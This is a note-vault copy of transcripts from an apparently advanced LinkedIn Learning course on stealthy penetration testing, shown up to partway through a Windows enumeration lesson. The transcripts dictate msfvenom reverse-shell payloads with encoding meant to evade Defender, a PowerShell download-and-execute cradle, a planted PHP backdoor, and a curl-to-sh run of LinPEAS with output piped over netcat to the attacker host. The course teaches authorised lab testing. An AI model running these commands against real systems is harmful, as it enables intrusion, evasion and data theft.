---
type: course
cssclasses:
  - lle-course
  - lle-level-advanced
slug: stealth-penetration-testing-with-advanced-enumeration
url: "https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration"
duration_minutes: 62
duration: 1h 2m
level: Advanced
updated: 8/4/2022
learners: 15721
skills:
  - Penetration Testing
  - Ethical Hacking
exercise_files: false
thumbnail: "https://media.licdn.com/dms/image/v2/C560DAQF--sp2TBlPVg/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1659468133021?e=2147483647&amp;v=beta&amp;t=5YHXjp08o_mpfV5X4-FzNlPgmEJg5aEKwJaPflgQZK0"
linkedin_topic: Cybersecurity
learning_paths:
  - '[[Become a Penetration Tester]]'
prev_courses:
  - '[[Burp Suite Essential Training]]'
path_nav: '[{"path":"Become a Penetration Tester","position":8,"total":8,"prev":"Burp Suite Essential Training","next":null}]'
path_count: 1
tags:
  - course
  - topic/security
  - skill/penetration-testing
  - skill/ethical-hacking
status: not-started
created: 2026-05-03
---

> <!-- lle:github-source --> [View this note on GitHub](https://github.com/thisis-romar/linkedin-learning-vault/blob/github-browse/Courses/Cybersecurity/Stealth%20Penetration%20Testing%20with%20Advanced%20Enumeration.md)

![Stealth Penetration Testing with Advanced Enumeration](https://media.licdn.com/dms/image/v2/C560DAQF--sp2TBlPVg/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1659468133021?e=2147483647&amp;v=beta&amp;t=5YHXjp08o_mpfV5X4-FzNlPgmEJg5aEKwJaPflgQZK0)

# Stealth Penetration Testing with Advanced Enumeration

> Once you’re proficient with basic ethical hacking techniques, you may be wondering about your next play. Advanced skills in evasion become increasingly necessary when you’re entering and operating on more complex systems. In this course, instructor Malcolm Shore shows you techniques to become a savvier penetration tester and take a big leap in your ethical hacking career.Explore strategies to avoi

> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration) | 1h 2m | Advanced | 16K learners
> [Jump to Path Context ↓](#path-context)

## Table of Contents

### Chapter Overview

- [**Introduction**](#introduction) (3 videos)
  - [Taking the next step in your ethical hacking career](#taking-the-next-step-in-your-ethical-hacking-career)
  - [What you should know](#what-you-should-know)
  - [Disclaimer](#disclaimer)
- [**1. Operating Stealthily**](#1-operating-stealthily) (3 videos)
  - [Being detected](#being-detected)
  - [Trying stealthy shells](#trying-stealthy-shells)
  - [Leaving footprints](#leaving-footprints)
- [**2. Living off the Land**](#2-living-off-the-land) (3 videos)
  - [What is living off the land?](#what-is-living-off-the-land)
  - [Using PowerHub](#using-powerhub)
  - [Using the PHPSploit shell](#using-the-phpsploit-shell)
- [**3. Advanced Enumeration**](#3-advanced-enumeration) (3 videos)
  - [Stealthy linux enumeration](#stealthy-linux-enumeration)
  - [Stealthy Windows enumeration](#stealthy-windows-enumeration)
  - [Powering up our escalation](#powering-up-our-escalation)
- [**4. Tunneling and Exfiltration**](#4-tunneling-and-exfiltration) (3 videos)
  - [Setting up and using an SSH tunnel](#setting-up-and-using-an-ssh-tunnel)
  - [Exfiltrating data over ICMP](#exfiltrating-data-over-icmp)
  - [Exfiltration via DNS](#exfiltration-via-dns)
- [**5. Escalating Privileges**](#5-escalating-privileges) (4 videos)
  - [Using Baron Samedit to escalate in Linux](#using-baron-samedit-to-escalate-in-linux)
  - [Escalating through a dirty pipe](#escalating-through-a-dirty-pipe)
  - [Escalating through a nightmare](#escalating-through-a-nightmare)
  - [Exploiting the Active Domain](#exploiting-the-active-domain)
- [**Conclusion**](#conclusion) (1 videos)
  - [What's next](#whats-next)

### Introduction

[↑ Back to Table of Contents](#table-of-contents)

#### [Taking the next step in your ethical hacking career](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/taking-the-next-step-in-your-ethical-hacking-career?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/taking-the-next-step-in-your-ethical-hacking-career?u=76281980&t=0)** - [Malcolm] As we build our careers in [[Ethical Hacking]], we'll be faced with more challenging areas of [[Penetration Testing]]. Basic enumeration may not provide everything we need and we'll want to use more advanced enumeration tools and techniques. We'll not just be testing a website or an application service from the local network. We'll also want to demonstrate the ability to penetrate and move deeper into the networks. We'll want to be able to exfiltrate information from targets inside the network perimeter to evidence that we've successfully penetrated them. I'm Malcolm Shore and I've spent a career helping governments and businesses protect their systems. I'd like to invite you to take this course and advance your knowledge and skills in ethical hacking. Now let's get started with Advanced Techniques for Ethical Hacking.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Ethical Hacking]] (3), [[Penetration Testing]] (1)
> **Speakers:** - [malcolm] (1)

#### [What you should know](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-you-should-know?u=76281980&t=0)** - [Instructor] This is a practical course. We'll be using [[Kali Linux]]-based tools to do testing, and we'll be using our own test network and some targets in the Offensive Security online [[Penetration Testing]] lab. You'll need to have a good working knowledge of Kali and a basic foundation of hands-on testing. You should have a working knowledge of [[Ethical Hacking]] tools, and you should have taken the ethical hacking series of courses. If you've taken the advanced Kali Linux course, that would be an advantage.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Kali Linux]] (2), [[Ethical Hacking]] (2), [[Penetration Testing]] (1)
> **Definitions:** is a  (1)
> **Prerequisites:** you'll need (1)
> **Speakers:** - [instructor] (1)

#### [Disclaimer](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/disclaimer?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of advanced [[Penetration Testing]] courses in which we use [[Kali Linux]] together with some third party commercial and open source testing software. While we've done our best to ensure that the tools we use and the sites we reference are legitimate, testing sites can be targets for hackers and we can't provide any assurance that these sites might not be compromised when you visit them. Some of the sites which store the testing tools are detected as dangerous because the tools have similar signatures to malware and may raise antivirus alerts when you visit them. Again, we can't provide assurance that the software hasn't been compromised when you download it. And so, as for any of the software from the internet, you need to exercise due diligence and take personal responsibility for anything you load into your system.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Penetration Testing]] (1), [[Kali Linux]] (1)
> **Speakers:** - [instructor] (1)


### 1. Operating Stealthily

[↑ Back to Table of Contents](#table-of-contents)

#### [Being detected](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=0)** - [Instructor] When we start our training as an ethical hacker, we'll often be testing against workstations that have antivirus and firewall restrictions turned off. While that's useful to build our foundational skills, the real world isn't so accommodating. When we're pen testing live systems, we're usually testing systems that have some level of defense. Such systems are designed to not only prevent unauthorized access, but to detect unauthorized access attempts. As a pen tester, we need to be able to not only find and exploit weaknesses, but also evade detection. Let's see how detection systems work. We'll make a standard [[Metasploit|MSFvenom]] payload for [[Windows]]: msfvenom -p windows/shell/ reverse_tcp LHOST=192.168.1.249 LPORT=2222 -f exe. And we'll save that as scmd.exe. Okay, we can use [[Python (Programming Language)|Python]] to set up a web server: python3 -m http.server, port 80.
>
> **[1:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=97)** I'm logged into my Windows workstation as Sam Spade. So now let's use [[Powershell]] to get the payload file. And we'll invoke WebRequest http colon, 192.168.1.249 /scmd.exe. And we'll UseBasicParsing.
>
> **[2:15](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=135)** And we'll Outfile that to scmd.exe. And that runs. And when we dir, we can see scmd.exe is in our folder. After a few seconds, we can run a dir again, and we can see the file has been removed. If we go into [[Microsoft Defender]] and look at Protection history,
>
> **[2:57](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/being-detected?u=76281980&t=177)** we can see that our file has been quarantined because it's a severe threat. Microsoft Defender has become a capable anti-malware system, and we need to learn how to work stealthily in a defended environment.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (3), [[Metasploit|Msfvenom]] (2), [[Microsoft Defender]] (2), [[Python (Programming Language)|Python]] (1), [[Powershell]] (1)
> **CLI Commands:** find (1), make (1), python (1), python3 (1)
> **Env Vars:** lhost (1), lport (1)
> **Versions:** 192.168.1 (2)
> **Code Identifiers:** reverse_tcp (1)
> **Ports:** port 80 (1)
> **Tools:** powershell (1)
> **Prerequisites:** set up (1)

#### [Trying stealthy shells](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=0)** - [Narrator] [[Metasploit|MSFvenom]] provides an encoding feature which enables us to create stealthy shells using the -e option. Let's check this out and see how effective it is. MSFvenom - p [[Windows]]/shell/reverse tcp
>
> **[0:27](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=27)** and we'll use the encoding feature x86/shikata ga nai
>
> **[0:38](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=38)** and we'll do five iterations. And again, our host is 192.168.1.249.
>
> **[0:52](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=52)** And our port is 2222. We're producing an exe file. And this time we'll call this xcmd.exe. This payload uses the shikata ga nai encoding scheme and runs the encoding five times to obfuscate the resulting code. Let's set up our web portal again Python3-m http.server 80
>
> **[1:28](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=88)** back in Windows. We'll try and download this executable again. Invoke WebRequest http 192.168.1.249/xcmd.exe
>
> **[1:53](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=113)** - Use basicparsing-Outfile xcmd.exe
>
> **[2:06](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=126)** and we've copied the file across and we can see it in our folder. Let's wait a few seconds and see if it is retained (pause) and it's gone again. Windows Defenders detected it and removed it. Let's go one step further and run a full encryption algorithm over the code. MSfvenom-p windows/shell reverse tcp
>
> **[2:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=162)** and we'll now encode it using the encryption algorithm rc4 and we'll use (pause) the encryption key blue sky. And again our Lhost is 192.168.1.249 our Lport=2222
>
> **[3:16](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=196)** The format we're going to produce is exe and we'll produce this time zcmd.exe (pause) Okay. Let's set up our web portal again Python3-m http.server 80
>
> **[3:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=217)** And again in [[Powershell]] we'll Invoke-WebRequest http 192.169.1.249/zcmd.exe
>
> **[3:58](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=238)** and we'll use basic parsing and Outfile to zcmd.exe
>
> **[4:14](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/trying-stealthy-shells?u=76281980&t=254)** that copies over and we can see it in our folder. (pause) [[Microsoft Defender]] still detects it despite applying encryption to the code. We used to be able to generate shell code using MSFvenom to load our code directly onto a Windows host with little effort. However, the encoding approaches used by MSFvenom are now being detected by Windows [[Microsoft Defender|Defender]] and it's become difficult for an inexperienced, ethical hacker to get a payload running. Windows has introduced the Antimalware Scan Interface which enables Windows Defender to scan scripts and the Windows Defender Advanced Threat Protection with its ability to leverage machine learning. Makes Windows a formidable challenge for the pen tester. Consequently, we need to have far more effective stealth techniques for our real world testing.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (10), [[Metasploit|Msfvenom]] (5), [[Microsoft Defender|Defender]] (3), [[Powershell]] (1), [[Microsoft Defender]] (1)
> **Non-Speech:** (typing) (6)
> **Versions:** 192.168.1 (3), 192.169.1 (1)
> **Speakers:** - [narrator] (1), - p (1), - use (1)
> **CLI Commands:** python3 (2)
> **Prerequisites:** set up (2)
> **Tools:** powershell (1)

#### [Leaving footprints](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=0)** - [Instructor] When we access and work on a platform, we're likely to have our presence recorded in some level of audit logs. Let's check the audit logs on our [[Windows]] workstation and see what we can find out about our activities so far. We'll start the Windows Event Viewer as system administrator. And we're in Windows System 32, right-click on Event Viewer, and run as administrator. We'll select the Windows Logs, Security, and we'll filter the log entries with an event code of 4624, which is an attempted logon. Now, we'll find all the activities related to SamSpadeO1.
>
> **[0:49](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=49)** In the lower pane, we can see that we have a successful logon attempt audited. And if we check the details, we'll find that the target username was SamSpade01. Let's check the system log. And again, we'll find all events for Sam Spade. We can see event ID 16, which is a kernel log related to updates. We'll ignore this. But as we check through
>
> **[1:29](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=89)** we find an event code 10116 warning, which indicates that we tried to do something, but didn't have the correct permission. Let's check the application and services logs. [[Microsoft]], Windows, and we'll check first of all Windows [[Microsoft Defender|Defender]], operational logs. Again, find Sam Spade account. And we can see the defender has logged the detection of our shell as a warning. And as we scroll down we can see it's been logged against SSpade01. We can also check in the same area our [[Powershell]] logs, the operational logs. Let's take a look at the log for executing a remote command and filter the current logs on event ID 4104. which is execute a remote command. On the main page, we see this records our username showing we executed a remote command. If we check the next entry and scroll down a little bit, we can see that our Meterpreter script has been logged.
>
> **[3:08](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/leaving-footprints?u=76281980&t=188)** These logs will usually be forwarded to a security information and event management system and will be visible to the level one operators in the security center. They'll also be visible in the event of an investigation being carried out. We've been noisy and we're detectable.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (6), [[Microsoft Defender|Defender]] (2), [[Microsoft]] (1), [[Powershell]] (1)
> **CLI Commands:** find (6)
> **UI Navigation:** scroll down (2), right-click (1), select the (1)
> **Definitions:** is an  (1), is a  (1)
> **Warnings:** warning (2)
> **Tools:** powershell (1)
> **Speakers:** - [instructor] (1)


### 2. Living off the Land

[↑ Back to Table of Contents](#table-of-contents)

#### [What is living off the land?](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=0)** - If it's difficult to transfer payloads into our target, then one option is to use the capabilities that exist on the target to carry out some or all of our testing. This is known as living off the land in cyber terminology. Living off the land has two major benefits. First, we avoid being detected as we attempt to upload shells and tools. And secondly, we hide our activities within the expected profile of activities running on the system. Picking out the malicious use of built-in tools versus the authorized use of tools by the system administrator can be somewhat like looking for a needle in a haystack. Using existing tools avoids the need to build, test, and QA our own customized tools. We don't have to worry about compatibility with the target or library dependencies. Building implants and tools that are stealthy enough to avoid detection and reliable enough to operate in a wide range of environments is expensive. Living off the land isn't. For [[Windows]], [[Powershell]] has been the built-in tool of choice for living off the land. There's also the cmd.exe command line shell which lets us do a lot of reconnaissance and the cscript.exe shell which provides visual basic scripting. We can use psexec from its internals for living off the land. And, we can also use the wmi command line tool, wmic.exe, both locally and remotely. Other tools, such as findstr can be used for searching the system. Bitsadmin can be used
>
> **[1:33](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=93)** to load external content. And, regedit enables storing information we might need, particularly for persistence. Living off the land in the [[Linux]] environment is similar but easier given the more extensive tools available. [[Netcat]], scp, curl and wget are often installed. And, grep and find provide much of what's needed for file-based reconnaissance. There's also awk, gawk, gdb, and other tools which we can use or exploit directly. In 2019, [[Microsoft]] reported a large number of Astaroth attacks. Astaroth is an information stealing malware that lives off the land. Astaroth employs multiple fileless techniques and abuses various legitimate processes to run stealthily on its targets. Originally, it leverage wmic for its activities but more recently, has been using alternate data streams. Astaroth starts as the result of a successful spear fishing attack and drops a one line [[JavaScript]] into iExplorer.exe. This executes to [[Fetch]] the main script into memory. It then uses the bits admin tool to download binary content, reconstitute it, and store it into an alternate data stream that it holds in Desktop.ini. It then loads ExtExport.exe, and injects the first stage of the malware, executes this to recover the second stage malware, which then injects the third stage malware into UserInit.exe to enable persistence.
>
> **[3:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-is-living-off-the-land?u=76281980&t=187)** It then executes its malicious actions using various plugins which are stored in the Desktop.ini alternate data stream. Astaroth is a good example of contemporary malware which lives off the land using capabilities and tools in the targets in conjunction with its own malicious code.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (1), [[Powershell]] (1), [[Linux]] (1), [[Netcat]] (1), [[Microsoft]] (1)
> **CLI Commands:** curl (1), wget (1), grep (1), find (1), awk (1)
> **Tools:** command line (2), powershell (1)
> **Definitions:** known as (1), is an  (1), is a  (1)
> **File Paths:** desktop.ini (2)
> **Code Identifiers:** iexplorer (1)
> **Analogies:** such as (1)
> **Speakers:** - if (1)

#### [Using PowerHub](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=0)** - [Narrator] While we can attempt to copy standard tools such as [[Netcat]] into [[Windows]], we're often defeated by windows [[Microsoft Defender|defender]] which detects these as malware tools. PowerHub has been developed as a more sophisticated and stealthy means of transferring files in and out of a target. We can download this from Adrian Vollmer [[GitHub]] site shown here. Okay, let's do exactly that. [[Git]] clone HTTPS [github.com](https://github.com),
>
> **[0:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=34)** Adrian Vollmer PowerHub dot git.
>
> **[0:45](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=45)** Okay, and let's start PowerHub up in its simplest form. We'll CD PowerHub and [[Python (Programming Language)|Python]] three powerhub.py.
>
> **[1:03](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=63)** And we'll put our IP address 192.168.1.249.
>
> **[1:11](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=71)** Okay, we give them details of the ports we'll be using port 8080 for the web portal and we have the credentials for using PowerHub. We can log into the portal using the external live peer address for Carly 192.168.1.249 column 8080.
>
> **[1:35](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=95)** And we put our credentials of PowerHub, and the password that we copied. As the target we'll be using is windows. We'll keep the [[Powershell]] launcher, but we could change that to a number of other environments, command bash vbscript and so on. The command which we'll use to connect to PowerHub from our target is shown in purple. PowerHub is a convenient way to use PowerSploit scripts. At the bottom of the screen, we have no module showing, so let's click on need more.
>
> **[2:19](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=139)** Okay, we've installed the power exploit modules. And if we reload modules, we'll see that there are 30 modules available now, which we can list. We're in our target now in PowerShell. And the first thing we'll do is switch off restricted execution policy, set dash execution policy, (keyboard clicks) unrestricted minus scope. (keyboard clicks) Current user. We can now run the PowerHub connector, and this was the purple line that we saw on the PowerHub portal. Dollar K equals new object net dot web client, semicolon,
>
> **[3:26](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=206)** A equals reflection, T equals HTTP
>
> **[3:35](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=215)** and will go to percent curly bracket IEX dollar K
>
> **[3:43](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=223)** (keyboard clicks) dot download string,
>
> **[3:51](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=231)** HTTP 192.168.1.249 colon 8080 slash zero question mark
>
> **[4:06](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=246)** plus dollar underscore. And we're connected to PowerHub. We can list the hub modules that are available, list slash hub modules. And we can see there are the 30 that we loaded earlier into PowerHub. We can start exfiltrating our reconnaissance information to PowerHub now. Let's start our reconnaissance with a basic check of the local groups. Get dash local group convert two [[JSON]],
>
> **[4:57](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=297)** (keyboard clicks) out file groups dot JSON. Okay, and we'll now exfiltrate that to PowerHub, push to hub groups dot JSON, okay.
>
> **[5:28](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=328)** Back in Carly, let's see what we've obtained. If we go to file exchange, we can see that we've collected the groups dot JSON file. We can download this from PowerHub into Carly and we'll save the file. Okay, let's see what we've obtained. First, we'll need to convert this to standard Unix line terminators dos two Unix downloads
>
> **[6:01](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=361)** slash groups dot JSON. And then we can use nano to look at it. Nano downloads slash groups dot JSON.
>
> **[6:18](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-powerhub?u=76281980&t=378)** And we see that we've exfiltrated the list of groups currently configured on the target system.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[JSON]] (6), [[Windows]] (3), [[GitHub]] (2), [[Git]] (2), [[Powershell]] (2)
> **Env Vars:** json (6), http (2), https (1), iex (1)
> **Tools:** github (2), powershell (2), bash (1)
> **CLI Commands:** git (2), cd (1), python (1)
> **Versions:** 192.168.1 (3)
> **UI Navigation:** go to (2), click on (1)
> **File Paths:** powerhub.py (1)
> **URLs:** [github.com](https://github.com) (1)

#### [Using the PHPSploit shell](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=0)** - [Instructor] PhpSploit is a stealthy backdoor post-implementation tool which provides a shell command interface to a backdoor [[PHP]] server. The implant itself is a single line of PHP code, which needs to be installed at some location in the website. We'll clone the tool [[Git]] clone HTTPS [github.com](https://github.com) nil 0x42 PhpSploit.
>
> **[0:40](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=40)** Okay. And then we need to go into PhpSploit and pip3 install -r.
>
> **[0:53](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=53)** Any requirements that aren't already in our system.
>
> **[1:01](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=61)** We've got a PHP website called Mutillidae Two, that [[OWASP]] provides for testing, and we'll use this as our target. This can be downloaded from the site shown here. We'll assume we've found a way to drop a file into this target, and we want to run a stealthy shell. All we need to do is upload a simple one-line PHP file and drop it into an accessible folder. We've dropped it into the Mutillidae/test sub-folder and called it an innocuously sounding "pat.php". Let's check what the file we've uploaded looks like. Cat/var/www/[[HTML]], our web root,
>
> **[1:44](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=104)** Mutillidae/test, and we called it "pat.php". And it's a simple one-line PHP file that we can execute remotely. Once we have the PHP file in place, we can run the PhpSploit tool. ./PhpSploit --interactive.
>
> **[2:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=130)** Okay, let's set our target URI. Set target HTTP 192.168.1.151,
>
> **[2:22](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-the-phpsploit-shell?u=76281980&t=142)** which is the address of our Mutillidae server. And we are looking for the Mutillidae website in the test sub-folder, and we want to run pat.php. And now we can exploit it. Exploit. We've got a good connection and we can now carry out our testing. And we can see our current folder! Let's check who we are. An unknown user. We've now got a stealthy unprivileged shell which we can use to do reconnaissance and to work towards privilege escalation. PhpSploit has an API and supports plugins, which we can find in the plugins folder. Once we're comfortable with it as a tool we can use it as a foundation to develop our own extensions for PHP website testing.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (10), [[Git]] (1), [[GitHub]] (1), [[OWASP]] (1), [[HTML]] (1)
> **CLI Commands:** php (10), git (1), pip3 (1), cat (1), find (1)
> **Env Vars:** php (7), https (1), owasp (1), html (1), uri (1)
> **File Paths:** pat.php (3)
> **Definitions:** is a  (2)
> **URLs:** [github.com](https://github.com) (1)
> **Versions:** 192.168.1 (1)
> **Tools:** github (1)


### 3. Advanced Enumeration

[↑ Back to Table of Contents](#table-of-contents)

#### [Stealthy linux enumeration](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=0)** - [[LinPEAS]] is an enumeration script which can be used to search for privilege escalation paths, on a [[Linux]] system. It's fairly quiet as it doesn't write anything to disc. It also runs fairly quickly, needing only a minute or so to do the basic checks and it has a limited brute force check included. We'll be stealthy and we'll run this from memory. We can download LinPEAS directly from [[GitHub]].
>
> **[0:31](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=31)** Okay. We can run it stealthily by executing it in memory rather than uploading the file to the target. We'll set up a web server so that we can access the LinPEAS script from our target in order to run it. python3 -m http.server on port 80. We'll also set a listener up so that we can send our output directly back to Kali. nc -lp 2222 and we'll tee that into linpeas .out. We're on our Linux target the Mutillidae II server, and we can now connect to and execute the LinPEAS script in memory, leaving no traces on disc. Curl 192 .168 .1.249 / linpeas.sh and we want to pipe that into sh and then take the output nc 192 .168 .1.249 2222 to go out to our Kali listener. It takes a few seconds for the script to upload and we start to see the script executing.
>
> **[2:05](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=125)** Not all of the tools it uses are present, so we're seeing some errors. Back in Kali we're seeing the output from LinPEAS and it's also being written to linpeas.out. We'll let this finish and then we'll review the output. LinPEAS provides color coded results and we're interested in particular in anything that's red. The basic information, highlights the pseudo and admin groups as being of interest, and that ping and nc are available on the target. It then identifies pseudo version as 1.8.31, which means this may be vulnerable to the Baron Samedit privilege escalation. The next finding of interest is a series of privilege escalation suggestions, including two for Baron Samedit. The process is running as router identified, as these could be leveraged to escalate our privileges. And where relevant, capabilities are highlighted. A little further down, we see that anacron is running as a root cron job, and this may be a path to escalation, if we can access the scripts. The enumeration is extensive, with additional information regarding Apache and [[MySQL]], as well as a list of open ports. There's much more, but we'll leave it here. LinPEAS doesn't escalate privileges for us but it does provide a full enumeration of the target, with a focus on privilege escalation,
>
> **[3:38](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=218)** and without leaving any traces on disc. This is a pretty good start to achieving an escalation.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[LinPEAS]] (10), [[Linux]] (2), [[GitHub]] (1), [[MySQL]] (1)
> **CLI Commands:** python3 (1), curl (1), apache (1), mysql (1)
> **Versions:** 1.249 (2), 1.8.31 (1)
> **Definitions:** is a  (2), is an  (1)
> **File Paths:** linpeas.sh (1)
> **Ports:** port 80 (1)
> **Tools:** github (1)
> **Prerequisites:** set up (1)

#### [Stealthy Windows enumeration](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=0)** - [Tutor] [[WinPEAS]] is the [[Windows]] variant of the [[LinPEAS]] privileged escalation tool and is available from Carlos Polop site. There's an obfuscate and obfuscated versions available. I've downloaded the obfuscated executable to Carly already and have a [[Python (Programming Language)|Python]] web server open. So let's copy it over to our target. We'll invoke web request http 192.168.1.249/
>
> **[0:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=37)** and I've called it winpeaso.exe for the obfuscated version and our out-file we'll just call winpeas.exe.
>
> **[0:51](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=51)** And that copies the file. And we can see that it's copied on to our system. And now it isn't. Unfortunately, this isn't a stealthy approach and we've been detected. [[Microsoft Defender|Defender]] does its magic and removes the file. There's a version of WinPEAS available as a ps1 module available from the website shown here. I've downloaded the WinPEAS ps1 module and added it to the PowerHub folders. We can list the recon modules. LS and they're in our .local share
>
